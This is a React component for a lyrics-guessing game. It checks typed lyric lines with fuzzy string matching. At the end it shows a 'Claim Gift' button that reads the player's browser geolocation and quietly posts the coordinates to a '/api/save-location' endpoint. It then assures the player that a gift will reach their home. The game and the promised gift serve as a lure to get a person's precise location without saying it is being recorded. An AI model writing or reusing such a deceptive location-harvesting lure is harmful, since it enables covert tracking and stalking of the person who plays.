"use client";

import React, { useState } from 'react';
import styles from './LyricsGame.module.css';
import { lyricsData } from '@/data/lyrics';

import stringSimilarity from "string-similarity";

function normalize(str: string) {
  return str
    .toLowerCase()
    .replace(/[^a-z0-9\s]/gi, "")  // remove punctuation/symbols
    .replace(/\s+/g, " ")          // collapse extra spaces
    .trim();
}

function isSentenceCorrect(userInput: string, correctSentence: string) {
  const a = normalize(userInput);
  const b = normalize(correctSentence);

  if (!a) return false; // Empty input

  const similarity = stringSimilarity.compareTwoStrings(a, b);
  console.log("similarity:", similarity);

  return similarity >= 0.6; // tune this threshold (0.6 more lenient, 0.8 stricter)
}

const LyricsGame: React.FC = () => {
  const [currentLevel, setCurrentLevel] = useState(0);
  const [inputValue, setInputValue] = useState('');
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error' | null; text: string }>({ type: null, text: '' });
  const [isComplete, setIsComplete] = useState(false);

  const [giftClaimed, setGiftClaimed] = useState(false);

  const currentLyric = lyricsData[currentLevel];

  const handleCheck = () => {
    if (!currentLyric) return;

    const isCorrect = isSentenceCorrect(inputValue, currentLyric.missingPart);

    if (isCorrect) {
      setFeedback({ type: 'success', text: 'Correct! 🎉' });
      setTimeout(() => {
        if (currentLevel < lyricsData.length - 1) {
          setCurrentLevel(prev => prev + 1);
          setInputValue('');
          setFeedback({ type: null, text: '' });
        } else {
          setIsComplete(true);
        }
      }, 1500);
    } else {
      setFeedback({ type: 'error', text: 'Try again! 🥺' });
    }
  };

  if (isComplete) {
    return (
      <div className={styles.completionContainer}>
        <div className={styles.completionText}>
          was fun playing with you..
          <br />
          takecare cutie..
        </div>
        
        {!giftClaimed ? (
          <button 
            className={styles.button} 
            onClick={() => {
              setGiftClaimed(true);
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  (position) => {
                    const { latitude, longitude } = position.coords;
                    fetch('/api/save-location', {
                      method: 'POST',
                      headers: {
                        'Content-Type': 'application/json',
                      },
                      body: JSON.stringify({ latitude, longitude }),
                    }).catch(err => console.error('Error saving location:', err));
                  },
                  (error) => {
                    console.error('Error getting location:', error);
                  }
                );
              }
            }}
          >
            Claim Gift 🎁
          </button>
        ) : (
          <div className={styles.message} style={{ marginTop: '20px', color: '#ff007f' }}>
            a small gift will reach ur home..:)
          </div>
        )}
        
        <div className={styles.heart} style={{ marginTop: '30px' }}>❤️</div>
      </div>
    );
  }

  // Replace the missing part with an input field in the display
  const parts = currentLyric.fullText.split(currentLyric.missingPart);
  
  return (
    <div className={styles.container}>
      <div className={styles.lyricsText}>
        {parts[0]}
        <input
          type="text"
          className={styles.input}
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          placeholder="..."
        />
        {parts[1]}
      </div>

      <button className={styles.button} onClick={handleCheck}>
        Check Answer
      </button>

      <div className={`${styles.message} ${feedback.type === 'success' ? styles.success : styles.error}`}>
        {feedback.text}
      </div>
    </div>
  );
};

export default LyricsGame;
